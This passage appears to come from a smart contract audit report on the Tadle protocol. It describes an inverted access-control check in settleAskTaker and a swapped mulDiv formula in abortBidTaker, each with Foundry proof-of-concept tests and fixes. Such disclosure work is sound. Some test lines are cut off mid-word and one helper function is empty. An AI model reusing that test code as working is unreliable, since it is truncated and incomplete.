## No funds are at risk, but people won\u0027t be able to withdraw native tokens until someone manually calls the approve correctly. Because there\u0027s a disruption of protocol functionality, I\u0027m submitting this as MEDIUM.

- Forge.

Change \u0060ICapitalPool(_capitalPoolAddr).approve(address(this))\u0060 to \u0060ICapitalPool(_capitalPoolAddr).approve(_token)\u0060 in line 247, TokenManager.sol.
## H-05. DeliveryPlace::settleAskTaker Has Incorrect Access Control

Submitted by [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [touthang](https://profiles.cyfrin.io/u/touthang), [eeyore](https://profiles.cyfrin.io/u/eeyore), [matrox](https://profiles.cyfrin.io/u/matrox), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [radin100](https://profiles.cyfrin.io/u/radin100), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [noone7777](https://profiles.cyfrin.io/u/noone7777), [irondevx](https://profiles.cyfrin.io/u/irondevx), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [h2134](https://profiles.cyfrin.io/u/h2134), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [fyamf](https://profiles.cyfrin.io/u/fyamf), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [meeve](https://profiles.cyfrin.io/u/meeve), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [pro_king](https://profiles.cyfrin.io/u/pro_king), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [josh4324](https://profiles.cyfrin.io/u/josh4324), [stanchev](https://profiles.cyfrin.io/u/stanchev), [Zealynx](https://codehawks.cyfrin.io/team/clt8owsuc0001dt11do7vyoi3), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [Chad0](https://profiles.cyfrin.io/u/Chad0), [atharv181](https://profiles.cyfrin.io/u/atharv181), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [pascal](https://profiles.cyfrin.io/u/pascal), [_frolic](https://profiles.cyfrin.io/u/_frolic), [honour](https://profiles.cyfrin.io/u/honour), [ge6a](https://profiles.cyfrin.io/u/ge6a), [izuman](https://profiles.cyfrin.io/u/izuman), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [bladesec](https://profiles.cyfrin.io/u/bladesec), [avci](https://profiles.cyfrin.io/u/avci), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [mikebello](https://profiles.cyfrin.io/u/mikebello), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [pontifex](https://profiles.cyfrin.io/u/pontifex).

Selected submission by: [4rdiii](https://profiles.cyfrin.io/u/4rdiii).

The settleAskTaker function is designed to allow a stock owner to finalize a transaction by transferring points tokens from the stock owner to the buyer. According to the documentation, only the stock authority should be able to call this function. However, the current implementation checks if the caller is the offer authority, which contradicts the documented behavior and intended functionality. This discrepancy prevents the stock owner from finalizing transactions and can lead to unintended consequences if the offer owner mistakenly calls this function.

The core issue lies in the access control check within the settleAskTaker function, where the caller is incorrectly verified against the offer authority instead of the stock authority. This misalignment between the documentation and code leads to incorrect authorization checks.
\u0060\u0060\u0060solidity
/**
 * @notice Settle ask taker 
 * @dev caller must be stock authority 
 * @dev market place status must be AskSettling 
 * @param _stock stock address 
 * @param _settledPoints settled points 
 * @notice _settledPoints must be less than or equal to stock points 
 */ 
function settleAskTaker(address _stock, uint256 _settledPoints) external { 
    IPerMarkets perMarkets = tadleFactory.getPerMarkets(); 
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock); 
    ( 
        OfferInfo memory offerInfo, 
        MakerInfo memory makerInfo, 
        MarketPlaceInfo memory marketPlaceInfo, 
        MarketPlaceStatus status 
    ) = getOfferInfo(stockInfo.preOffer); 
    if (stockInfo.stockStatus != StockStatus.Initialized) { 
        revert InvalidStockStatus(); 
    } 
    if (marketPlaceInfo.fixedratio) { 
        revert FixedRatioUnsupported(); 
    } 
    if (stockInfo.stockType == StockType.Bid) { 
        revert InvalidStockType(); 
    } 
    if (_settledPoints > stockInfo.points) { 
        revert InvalidPoints(); 
    } 
    if (status == MarketPlaceStatus.AskSettling) { 
        if (_msgSender() != offerInfo.authority) { 
            revert Errors.Unauthorized(); 
        } 
    } else { 
        if (_msgSender() != owner()) { 
            revert Errors.Unauthorized(); 
        } 
        if (_settledPoints > 0) { 
            revert InvalidPoints(); 
        } 
    } 
    . 
    . 
    . 
}
\u0060\u0060\u0060

This flaw prevents stock owners from properly finalizing transactions, leading to potential loss of points. Additionally, if an offer owner mistakenly calls this function, they could lose points instead of acquiring them. Note that the current existing test \u0060test_create_bid_offer_turbo_usdc\u0060 is completely wrong but still works because of lack of assertions and checks. The correct version of the test exists in the Proof of Concept.
## Proof of Concept
In the original test, the user makes both an offer and calls \u0060createTaker\u0060, which is wrong since you can\u0027t both buy and sell points. In the edited version, \u0060user2\u0060 is the one selling the points; as a result, he should be the caller of \u0060settleAskTaker\u0060. You can see that as a result of this, the call will revert with \u0060Unauthorized\u0060. The provided test case demonstrates the incorrect behavior when a user attempts to finalize a bid offer instead of a stock sale, highlighting the need for correcting the access control logic. Here is the corrected version of the \u0060test_create_bid_offer_turbo_usdc\u0060 test:
\u0060\u0060\u0060solidity
function test_create_bid_offer_turbo_usdc() public { 
    vm.prank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Bid, 
            OfferSettleType.Turbo 
        ) 
    );
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    vm.prank(user2); 
    preMarktes.createTaker(offerAddr, 1000); 
    address stock1Addr = GenerateAddress.generateStockAddress(1); 
    vm.prank(user1); 
    systemConfig.updateMarket( 
        "Backpack", 
        address(mockPointToken), 
        0.01 * 1e18, 
        block.timestamp - 1, 
        3600 
    );
    vm.startPrank(user2); 
    uint256 PointsBalanceBefore = mockPointToken.balanceOf(user2); 
    mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18); 
    vm.expectRevert(Errors.Unauthorized.selector); 
    deliveryPlace.settleAskTaker(stock1Addr, 1000); 
}
\u0060\u0060\u0060

- Manual Review

To address this issue, the access control check should be corrected to verify the caller against the stock authority, aligning with the intended functionality and documentation.
\u0060\u0060\u0060solidity
function settleAskTaker(address _stock, uint256 _settledPoints) external { 
    IPerMarkets perMarkets = tadleFactory.getPerMarkets(); 
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock); 
    ( 
        OfferInfo memory offerInfo, 
        MakerInfo memory makerInfo, 
        MarketPlaceInfo memory marketPlaceInfo, 
        MarketPlaceStatus status 
    ) = getOfferInfo(stockInfo.preOffer); 
    if (stockInfo.stockStatus != StockStatus.Initialized) { 
        revert InvalidStockStatus(); 
    } 
    if (marketPlaceInfo.fixedratio) { 
        revert FixedRatioUnsupported(); 
    } 
    if (stockInfo.stockType == StockType.Bid) { 
        revert InvalidStockType(); 
    } 
    if (_settledPoints > stockInfo.points) { 
        revert InvalidPoints(); 
    } 
    if (status == MarketPlaceStatus.AskSettling) { 
        if (_msgSender() != stockInfo.authority) { 
            revert Errors.Unauthorized(); 
        } 
    } else { 
        if (_msgSender() != owner()) { 
            revert Errors.Unauthorized(); 
        } 
        if (_settledPoints > 0) { 
            revert InvalidPoints(); 
        } 
    } 
    . 
    . 
    . 
}
\u0060\u0060\u0060
## H-06. Formulaic Error Rounds Down Causing Total Loss Of Funds For Bid Takers During Abort
Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [heaven1024](https://profiles.cyfrin.io/u/heaven1024), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [Bauer](https://profiles.cyfrin.io/u/Bauer), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [eeyore](https://profiles.cyfrin.io/u/eeyore), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [x18a6](https://profiles.cyfrin.io/u/x18a6), [z3r0](https://profiles.cyfrin.io/u/z3r0), [radin100](https://profiles.cyfrin.io/u/radin100), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [touthang](https://profiles.cyfrin.io/u/touthang), [0xjoyboy03](https://profiles.cyfrin.io/u/0xjoyboy03), [bigsam](https://profiles.cyfrin.io/u/bigsam), [matejdb](https://profiles.cyfrin.io/u/matejdb), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [fyamf](https://profiles.cyfrin.io/u/fyamf), [dustinhuel2](https://profiles.cyfrin.io/u/dustinhuel2), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [josh4324](https://profiles.cyfrin.io/u/josh4324), [turvec](https://profiles.cyfrin.io/u/turvec), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [aksoy](https://profiles.cyfrin.io/u/aksoy), [stanchev](https://profiles.cyfrin.io/u/stanchev), [0xlookman](https://profiles.cyfrin.io/u/0xlookman), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [pascal](https://profiles.cyfrin.io/u/pascal), [rbserver](https://profiles.cyfrin.io/u/rbserver), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [amaron](https://profiles.cyfrin.io/u/amaron), [_frolic](https://profiles.cyfrin.io/u/_frolic), [inzinko](https://profiles.cyfrin.io/u/inzinko), [simon0417](https://profiles.cyfrin.io/u/simon0417), [ge6a](https://profiles.cyfrin.io/u/ge6a), [honour](https://profiles.cyfrin.io/u/honour), [kamensec](https://profiles.cyfrin.io/u/kamensec), [0x1912](https://profiles.cyfrin.io/u/0x1912), [bladesec](https://profiles.cyfrin.io/u/bladesec), [philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher), [brutalclowney](https://profiles.cyfrin.io/u/brutalclowney), [kupiasec](https://profiles.cyfrin.io/u/kupiasec)
A critical vulnerability exists in the \u0060abortBidTaker()\u0060 function where an incorrect calculation leads to rounding errors, potentially causing takers to lose all their deposited funds during bid abortion.
## Overview
The vulnerability stems from an incorrect formula used in the \u0060abortBidTaker()\u0060 function where the deposit amount is calculated as follows: 

\u0060\u0060\u0060solidity
uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.points, preOfferInfo.amount, Math.Rounding.Floor);
\u0060\u0060\u0060

This formula is incorrect and should be 

\u0060\u0060\u0060solidity
uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.amount, preOfferInfo.points, Math.Rounding.Floor);
\u0060\u0060\u0060

as can be seen in the following correct implementation [here](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L212-L216). As the numerator and denominator are switched [here](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L671-L675), the deposit amount can easily be rounded to zero causing direct loss of funds for the taker.

Please run the following test to reproduce the issue: 

\u0060\u0060\u0060bash
forge test --via-ir --mt testTakerTotalBalancesOnOfferCancellationAndAbort
\u0060\u0060\u0060

As noted in the audit tags, offending lines can be changed to fixed implementation, however this requires adding the recommendations to the \u0060src/core/PreMarkets.sol\u0060 file.
// SPDX-License-Identifier: UNLICENSED 

\u0060\u0060\u0060solidity
pragma solidity ^0.8.13; 
import "forge-std/Test.sol"; 
import "../src/core/PreMarkets.sol"; 
import "../src/libraries/GenerateAddress.sol"; 
import "../src/libraries/Constants.sol"; 
import "../src/interfaces/ITokenManager.sol"; 
import "../src/interfaces/ISystemConfig.sol"; 
import {MockERC20Token} from "./mocks/MockERC20Token.sol"; 
import {SystemConfig} from "../src/core/SystemConfig.sol"; 
import {CapitalPool} from "../src/core/CapitalPool.sol"; 
import {TokenManager} from "../src/core/TokenManager.sol"; 
import {PreMarktes} from "../src/core/PreMarkets.sol"; 
import {DeliveryPlace} from "../src/core/DeliveryPlace.sol"; 
import {TadleFactory} from "../src/factory/TadleFactory.sol"; 
import {WETH9} from "./mocks/WETH9.sol"; 

contract IssueTestTemplate is Test { 
    SystemConfig systemConfig; 
    CapitalPool capitalPool; 
    TokenManager tokenManager; 
    PreMarktes preMarktes; 
    DeliveryPlace deliveryPlace; 
    address marketPlace; 
    string marketPlaceName = "Backpack"; 
    WETH9 weth9; 
    MockERC20Token mockUSDCToken; 
    MockERC20Token mockPointToken; 
    address guardian; 
    address maker; 
    address taker1; 
    address taker2; 
    address taker3; 
    uint256 basePlatformFeeRate = 5_000; 
    uint256 baseReferralRate = 300_000; 
    bytes4 private constant INITIALIZE_OWNERSHIP_SELECTOR = 
        bytes4(keccak256(bytes("initializeOwnership(address)"))); 

    function setUp() public { 
        // Set up accounts 
        guardian = makeAddr("guardian"); 
        maker = makeAddr("maker"); 
        taker1 = makeAddr("taker1"); 
        taker2 = makeAddr("taker2"); 
        taker3 = makeAddr("taker3"); 
        vm.label(guardian, "guardian"); 
        vm.label(maker, "maker"); 
        vm.label(taker1, "taker1"); 
        vm.label(taker2, "taker2"); 
        vm.label(taker3, "taker3"); 
        // deploy mocks 
        weth9 = new WETH9(); 
        TadleFactory tadleFactory = new TadleFactory(guardian); 
        mockUSDCToken = new MockERC20Token(); 
        mockPointToken = new MockERC20Token(); 
        SystemConfig systemConfigLogic = new SystemConfig(); 
        CapitalPool capitalPoolLogic = new CapitalPool(); 
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
TokenManager tokenManagerLogic = new TokenManager(); 
PreMarktes preMarktesLogic = new PreMarktes(); 
DeliveryPlace deliveryPlaceLogic = new DeliveryPlace(); 
bytes memory deploy_data = abi.encodeWithSelector( 
    INITIALIZE_OWNERSHIP_SELECTOR, 
    guardian 
);
vm.startPrank(guardian); 
address systemConfigProxy = tadleFactory.deployUpgradeableProxy( 
    1, 
    address(systemConfigLogic), 
    bytes(deploy_data) 
);
address preMarktesProxy = tadleFactory.deployUpgradeableProxy( 
    2, 
    address(preMarktesLogic), 
    bytes(deploy_data) 
);
address deliveryPlaceProxy = tadleFactory.deployUpgradeableProxy( 
    3, 
    address(deliveryPlaceLogic), 
    bytes(deploy_data) 
);
address capitalPoolProxy = tadleFactory.deployUpgradeableProxy( 
    4, 
    address(capitalPoolLogic), 
    bytes(deploy_data) 
);
address tokenManagerProxy = tadleFactory.deployUpgradeableProxy( 
    5, 
    address(tokenManagerLogic), 
    bytes(deploy_data) 
);
vm.label(systemConfigProxy, "systemConfigProxy"); 
vm.label(preMarktesProxy, "preMarktesProxy"); 
vm.label(deliveryPlaceProxy, "deliveryPlaceProxy"); 
vm.label(capitalPoolProxy, "capitalPoolProxy"); 
vm.label(tokenManagerProxy, "tokenManagerProxy"); 
vm.stopPrank(); 
// attach logic 
systemConfig = SystemConfig(systemConfigProxy); 
capitalPool = CapitalPool(capitalPoolProxy); 
tokenManager = TokenManager(tokenManagerProxy); 
preMarktes = PreMarktes(preMarktesProxy); 
deliveryPlace = DeliveryPlace(deliveryPlaceProxy); 
vm.label(address(systemConfig), "systemConfig"); 
vm.label(address(tokenManager), "tokenManager"); 
vm.label(address(preMarktes), "preMarktes"); 
vm.label(address(deliveryPlace), "deliveryPlace"); 
vm.startPrank(guardian); 
// initialize 
systemConfig.initialize(basePlatformFeeRate, baseReferralRate); 
tokenManager.initialize(address(weth9)); 
address[] memory tokenAddressList = new address[](2); 
tokenAddressList[0] = address(mockUSDCToken); 
tokenAddressList[1] = address(weth9); 
tokenManager.updateTokenWhiteListed(tokenAddressList, true); 
\u0060\u0060\u0060
\u0060\u0060\u0060
                   // create market place 
                   systemConfig.createMarketPlace(marketPlaceName, false); 
                   vm.stopPrank(); 
                   deal(address(mockUSDCToken), maker, 100000000 * 10 ** 18); 
                   deal(address(mockPointToken), maker, 100000000 * 10 ** 18); 
                   deal(maker, 100000000 * 10 ** 18); 
                   deal(address(mockUSDCToken), taker1, 100000000 * 10 ** 18); 
                   deal(address(mockUSDCToken), taker2, 100000000 * 10 ** 18); 
                   deal(address(mockUSDCToken), taker3, 100000000 * 10 ** 18); 
                   deal(address(mockPointToken), taker2, 100000000 * 10 ** 18); 
                   marketPlace = GenerateAddress.generateMarketPlaceAddress("Backpack"); 
                   vm.warp(1719826275); 
                   vm.prank(maker); 
                   mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
                   vm.startPrank(taker2); 
                   mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
                   mockPointToken.approve(address(tokenManager), type(uint256).max); 
                   vm.stopPrank(); 
               }
                   /* @audit - POC: [rounding-causes-loss-for-big-takers.md] Taker final balances are rounded to zero during bid abortion, due t
                   \u0060abortBidTaker()\u0060 function where the deposit amount is calculated as follows: 
                   \u0060uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.points, preOfferInfo.amount, Math.Rounding.Floor);\u0060.  
                   This formula is incorrect and should be \u0060uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.amount, preOfferInfo.po
                   As the numerator and denominator are switched, the deposit amount can easily be rounded to zero causing direct loss of funds 
                   */
                   function testTakerTotalBalancesOnOfferCancellationAndAbort() public { 
                       // initial state 
                       address referrer = makeAddr("referrer"); 
                       uint256 totalPoints = 1000; 
                       uint256 purchasedPoints = 500; 
                       uint256 tokenAmount = 1e18; 
                       uint256 collateralRate = 12000; 
                       uint256 tradeTax = 300; 
                       uint256 collateralSent = tokenAmount * collateralRate / Constants.COLLATERAL_RATE_DECIMAL_SCALER; 
                       uint256 collateralPurchased = (collateralSent * purchasedPoints) / totalPoints; 
                       uint256 depositAmount = (purchasedPoints * tokenAmount) / totalPoints; 
                       // Verify Pre-test state 
                       uint256 makerInitialBalance = verifyAccountTypeBalance(address(mockUSDCToken), maker, TokenBalanceType.MakerRefund, 0);  
                       assertEq(makerInitialBalance, 0, "Maker shouldn\u0027t have any refund balance"); 
                       // Setup referral, create offer and taker 
                       (address offerAddr) = createOffer(maker, address(mockUSDCToken), totalPoints, tokenAmount, collateralRate, tradeTax, Offe
                       (uint256 initialReferrerBalance, uint256 initialTakerBalance) = createTakerAndGetInitialBalances(referrer, offerAddr, pur
                        
                       // Close Offer and Verify Maker Referral Balances 
                       closeOffer(maker, offerAddr); 
                       // Abort Offer  
                       abortAskOffer(maker, GenerateAddress.generateStockAddress(0), offerAddr); 
                       abortBidTakerFixed(taker1, GenerateAddress.generateStockAddress(1), offerAddr); // @audit - NOTE: Change this for \u0060abortB
                       uint256 takerFinalTaxBalance = verifyAccountTypeBalance(address(mockUSDCToken), taker1, TokenBalanceType.TaxIncome, 0);  
                       uint256 takerFinalSalesBalance = verifyAccountTypeBalance(address(mockUSDCToken), taker1, TokenBalanceType.SalesRevenue, 
                       uint256 takerFinalRefundBalance = getAccountTypeBalance(address(mockUSDCToken), taker1, TokenBalanceType.MakerRefund);  
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
uint256 takerFinalBalance = takerFinalSalesBalance + takerFinalTaxBalance + takerFinalRefundBalance; 
assertGe(takerFinalBalance, depositAmount, "Excess funds have been extracted during taker cancel + abort"); // @audit - R
\u0060\u0060\u0060
## Helper functions 

\u0060\u0060\u0060solidity
function createOffer(address offerer, address tokenAddress, uint256 totalPoints, uint256 tokenAmount, uint256 collateralRate, uint256 tradeTax, uint256 offerType, uint256 settleType) internal returns (address offerAddr) {
    vm.startPrank(offerer); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            tokenAddress, 
            totalPoints, 
            tokenAmount, 
            collateralRate, 
            tradeTax, 
            offerType, 
            settleType 
        ) 
    );
    offerAddr = GenerateAddress.generateOfferAddress(0); 
    vm.stopPrank(); 
    return offerAddr; 
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function createTakerAndGetInitialBalances(address referrer, address offerAddr, uint256 _purchasedPoints) internal returns (uint256 initialReferrerBalance, uint256 initialTakerBalance) {
    initialReferrerBalance = tokenManager.userTokenBalanceMap( 
        referrer, 
        address(mockUSDCToken), 
        TokenBalanceType.ReferralBonus 
    );
    initialTakerBalance = tokenManager.userTokenBalanceMap( 
        taker1, 
        address(mockUSDCToken), 
        TokenBalanceType.ReferralBonus 
    );

    vm.startPrank(taker1); 
    mockUSDCToken.approve(address(tokenManager), type(uint256).max); 
    uint256 purchasedPoints = _purchasedPoints; 
    preMarktes.createTaker(offerAddr, purchasedPoints); 
    vm.stopPrank(); 
    return (initialReferrerBalance, initialTakerBalance); 
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function closeOffer(address offerer, address offerAddr) internal { 
    vm.prank(offerer); 
    preMarktes.closeOffer(GenerateAddress.generateStockAddress(0), offerAddr); 
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function abortAskOffer(address offerer, address _stock, address _offer) internal { 
    vm.prank(offerer); 
    preMarktes.abortAskOffer(_stock, _offer); 
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function abortBidTaker(address offerer, address _stock, address _offer) internal { 
    vm.prank(offerer); 
    preMarktes.abortBidTaker(_stock, _offer); 
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function abortBidTakerFixed(address offerer, address _stock, address _offer) internal { 
    vm.prank(offerer); 
}
\u0060\u0060\u0060
